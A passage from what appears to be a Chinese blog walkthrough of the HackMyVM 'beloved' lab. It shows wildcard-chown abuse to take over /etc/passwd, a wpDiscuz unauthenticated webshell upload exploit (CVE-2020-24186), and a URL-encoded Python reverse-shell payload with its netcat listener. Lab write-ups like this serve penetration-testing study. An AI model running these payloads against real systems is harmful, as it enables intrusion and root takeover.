class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2796</span>   | /usr/sbin/CRON <span class="operator">-f</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2797</span>   | /bin/sh <span class="literal">-c</span> <span class="built_in">cd</span> /opt &amp;&amp; chown root:root *</span><br></pre></td></tr></table></figure>

<p>发现后台每次都有一次chown root</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">touch reference</span><br><span class="line">touch <span class="literal">--</span> <span class="literal">--reference</span>=reference</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">27</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2832</span>   | /usr/sbin/CRON <span class="operator">-f</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">27</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2833</span>   | /usr/sbin/CRON <span class="operator">-f</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">27</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2834</span>   | /bin/sh <span class="literal">-c</span> <span class="built_in">cd</span> /opt &amp;&amp; chown root:root *</span><br><span class="line">ln <span class="literal">-s</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p>简单解释下：</p>
<p>​	因为chown root:root后面这个*，让后台程序运行起来变成 chown root:root –reference&#x3D;reference id_rsa passwd，此时–reference文件变成了参数。</p>
<p>等待1分钟然后查看&#x2F;etc&#x2F;passwd文件权限（把pspy64关了）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">touch reference</span><br><span class="line">touch <span class="literal">--</span> <span class="literal">--reference</span>=reference</span><br><span class="line">ln <span class="literal">-s</span> /etc/passwd</span><br><span class="line"><span class="built_in">ls</span> <span class="literal">-al</span></span><br><span class="line">total <span class="number">12</span></span><br><span class="line"><span class="literal">-rw-r--r--</span>  <span class="number">1</span> beloved beloved    <span class="number">0</span> Jul <span class="number">24</span> <span class="number">08</span>:<span class="number">37</span> <span class="literal">--reference</span>=reference</span><br><span class="line">drwxrwx<span class="literal">---</span>  <span class="number">2</span> root    beloved <span class="number">4096</span> Jul <span class="number">24</span> <span class="number">08</span>:<span class="number">37</span> .</span><br><span class="line">drwxr<span class="literal">-xr-x</span> <span class="number">18</span> root    root    <span class="number">4096</span> May <span class="number">19</span>  <span class="number">2021</span> ..</span><br><span class="line"><span class="literal">-rw-------</span>  <span class="number">1</span> root    root    <span class="number">1823</span> Jun <span class="number">27</span>  <span class="number">2021</span> id_rsa</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> beloved beloved   <span class="number">11</span> Jul <span class="number">24</span> <span class="number">08</span>:<span class="number">37</span> passwd -&gt; /etc/passwd</span><br><span class="line"><span class="literal">-rw-r--r--</span>  <span class="number">1</span> root    root       <span class="number">0</span> Jul <span class="number">24</span> <span class="number">08</span>:<span class="number">36</span> reference</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 123123 #生成md5</span><br><span class="line">vi /etc/passwd #写入</span><br></pre></td></tr></table></figure>



<h2 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h2><p>1.搜索漏洞：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># searchsploit wpDiscuz</span></span><br><span class="line"><span class="literal">----------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line"> Exploit Title                                                                                                  |  Path</span><br><span class="line"><span class="literal">----------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line">Wordpress Plugin wpDiscuz <span class="number">7.0</span>.<span class="number">4</span> - Arbitrary File Upload (Unauthenticated)                                       | php/webapps/<span class="number">49962</span>.sh</span><br><span class="line">WordPress Plugin wpDiscuz <span class="number">7.0</span>.<span class="number">4</span> - Remote Code Execution (Unauthenticated)                                       | php/webapps/<span class="number">49967</span>.py</span><br><span class="line">Wordpress Plugin wpDiscuz <span class="number">7.0</span>.<span class="number">4</span> - Unauthenticated Arbitrary File Upload (Metasploit)                            | php/webapps/<span class="number">49401</span>.rb</span><br><span class="line"><span class="literal">----------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.攻击一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/usr/…/exploitdb/exploits/php/webapps]</span><br><span class="line">└─# searchsploit -m 49967</span><br><span class="line">python3 49967.py -u http://192.168.56.129 -p /2021/06/09/hello-world</span><br><span class="line">  Exploit: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/49967</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/49967.py</span><br><span class="line">    Codes: CVE-2020-24186</span><br><span class="line"> Verified: False</span><br><span class="line">File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (864)</span><br><span class="line">cp: &#x27;/usr/share/exploitdb/exploits/php/webapps/49967.py&#x27; and &#x27;/usr/share/exploitdb/exploits/php/webapps/49967.py&#x27; are the same file</span><br><span class="line">Copied to: /usr/share/exploitdb/exploits/php/webapps/49967.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution</span><br><span class="line">[-] File Upload Bypass Vulnerability - PHP Webshell Upload</span><br><span class="line">[-] CVE: CVE-2020-24186</span><br><span class="line">[-] https://github.com/hevox</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[+] Response length:[51725] | code:[200]</span><br><span class="line">[!] Got wmuSecurity value: b7783836e9</span><br><span class="line">[!] Got wmuSecurity value: 1</span><br><span class="line"></span><br><span class="line">[+] Generating random name for Webshell...</span><br><span class="line">[!] Generated webshell name: tqguliyjfehjyqq</span><br><span class="line"></span><br><span class="line">[!] Trying to Upload Webshell..</span><br><span class="line">[+] Upload Success... Webshell path:url&amp;quot;:&amp;quot;http://beloved/wp-content/uploads/2023/07/tqguliyjfehjyqq-1690181429.2712.php&amp;quot;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>发现注入漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://beloved/wp-content/uploads/2023/07/tqguliyjfehjyqq-1690181429.2712.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.56.127%22,8888));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure>

<p>反弹攻击，开启端口监听</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nc -lvnp 8888</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">8888</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.56.127</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.56.129</span>] <span class="number">45814</span></span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal <span class="keyword">process</span> <span class="built_in">group</span> (<span class="number">455</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www<span class="literal">-data</span>@beloved:/var/www/html/wordpress/wp<span class="literal">-content</span>/uploads/<span class="number">2023</span>/<span class="number">07</span><span class="variable">$</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其余步骤一致</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/24/beloved/" data-id="clmnr8k040005so8g42az3lq6" data-title="beloved" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chown/" rel="tag">chown</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/msfs/" rel="tag">msfs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2023/07/25/friendly/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          friendly
        
      </div>
    </a>
  
  
    <a href="/2023/07/23/alzheimer/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">alzheimer</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/hack-the-box/">hack the box</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/home/">home</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E5%AD%A6%E4%B9%A0/">linux学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/burp-suite/" rel="tag">burp suite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chown/" rel="tag">chown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/find/" rel="tag">find</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gittools/" rel="tag">gittools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/home/" rel="tag">home</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hydra/" rel="tag">hydra</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag">linux提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/" rel="tag">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msfs/" rel="tag">msfs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nmap/" rel="tag">nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pspy/" rel="tag">pspy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellinabox/" rel="tag">shellinabox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/talnet/" rel="tag">talnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tryhackme/" rel="tag">tryhackme</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" rel="tag">目录渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="tag">目录遍历</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" rel="tag">路径劫持</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/burp-suite/" style="font-size: 10px;">burp suite</a> <a href="/tags/chown/" style="font-size: 10px;">chown</a> <a href="/tags/find/" style="font-size: 10px;">find</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/fuzz/" style="font-size: 12.5px;">fuzz</a> <a href="/tags/gittools/" style="font-size: 10px;">gittools</a> <a href="/tags/hackmyvm/" style="font-size: 20px;">hackmyvm</a> <a href="/tags/home/" style="font-size: 10px;">home</a> <a href="/tags/hydra/" style="font-size: 10px;">hydra</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 10px;">linux提权</a> <a href="/tags/msf/" style="font-size: 12.5px;">msf</a> <a href="/tags/msfs/" style="font-size: 10px;">msfs</a> <a href="/tags/nmap/" style="font-size: 10px;">nmap</a> <a href="/tags/pspy/" style="font-size: 10px;">pspy</a> <a href="/tags/shellinabox/" style="font-size: 10px;">shellinabox</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/talnet/" style="font-size: 10px;">talnet</a> <a href="/tags/tryhackme/" style="font-size: 17.5px;">tryhackme</a> <a href="/tags/webshell/" style="font-size: 15px;">webshell</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" style="font-size: 10px;">目录渗透</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" style="font-size: 12.5px;">目录遍历</a> <a href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">路径劫持</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/09/18/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2023/09/18/home/">home</a>
          </li>
        
          <li>
            <a href="/2023/08/30/linux%E6%8F%90%E6%9D%83/">linux提权</a>
          </li>
        
          <li>
            <a href="/2023/08/19/venus/">venus</a>
          </li>
        
          <li>
            <a href="/2023/08/11/flower/">flower</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 honkerZ<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>